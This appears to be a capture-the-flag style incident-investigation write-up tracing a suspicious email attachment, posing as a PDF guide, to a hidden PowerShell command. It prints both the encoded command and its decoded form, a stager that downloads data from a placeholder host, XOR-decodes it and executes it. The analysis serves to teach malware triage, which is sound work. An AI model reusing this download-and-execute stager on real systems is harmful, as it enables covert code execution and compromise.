### First Insights

At this point in the investigation we know that a machine associated with *Online Operations and Production Servicest (OOPS)* company has communicated with the foreign Listening Post. From the previous task, we were able to identify the employee associated with the account on the machine. During an incident response interview, the user mentioned that they were checking email around the time that the communication occured. They stated that they did not remember anything weird that occured while checking email. The led OOPS to provide us with a subset of the user's inbox from the day of the incident.

### Beginning the Investigation

Starting with the provided collection of 24 emails, the inital thought was to check the content of the emails for malicious links or files. Two examples of suspected emails are contained within this task's directory. After checking the links contained in emails, there was no lead to a malicious actor as there domain of the links did not match the Wireshark capture from Task 1. The next step was to identify an email with a malicious attachment. After doing research on [email attachments](https://en.wikipedia.org/wiki/Email_attachment), it was found that the files are encoded in Base64 and malware is commonly attached, pointing us in the correct direction.

### Decoding the attachments

Given that any of the emails containing attachments are suspect, this quickly became a process of elimination. Going through the emails that contianed attachments, the files were decoded using an online [Base64 Decoder](https://www.base64decode.org/). After decoding a lot of pictures of puppies and meeting powerpoints, a lead was finally found. The attachment in *message_16* (see in repo directory), claiming to be a PDF guide to installing/using FOOT was found to contain a powershell script. Below is a snippit of the decoded "PDF".

```
powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AcgBvAGsAdwB6AC4AaQBuAHYAYQBsAGkAZAAvAHMAZQBjAHUAcgBpAHQAeQAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADkAMAAKAAoAJABkAGUAYwAgAD0AIAAkACgAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4AbABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAcAByAGUAdgAgAD0AIAAkAGIAeQB0AGUAcwBbACQAaQBdACAALQBiAHgAbwByACAAJABwAHIAZQB2AAoAIAAgACAAIAAkAHAAcgBlAHYACgB9ACkACgAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwApACkACgA=
```

### Understaing the Script

There were a few inital questions that presented themselves after seeing the malicious script. First being, what are these flags and what is this gibberish? After looking into [powershell flags](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1), it was concluded that the *-nop, -noni* and *-w Hidden* flags were unimportant to understand what this script was doing. The most imporatant flag was the *-enc or EncodedCommand* flag and the corresponding encoded text. Moving forward, the obvious step was to decode the encoded part of the script to see what was going on behind the curtain of obfusication. Decoding the script using the same online Base64 Decoder above, we were faced with an addition to the script, obviously malicious...

```
$bytes = (New-Object Net.WebClient).DownloadData('http://rokwz.invalid/security')

$prev = [byte] 90

$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
    $prev = $bytes[$i] -bxor $prev
    $prev
})

iex([System.Text.Encoding]::UTF8.GetString($dec))
```


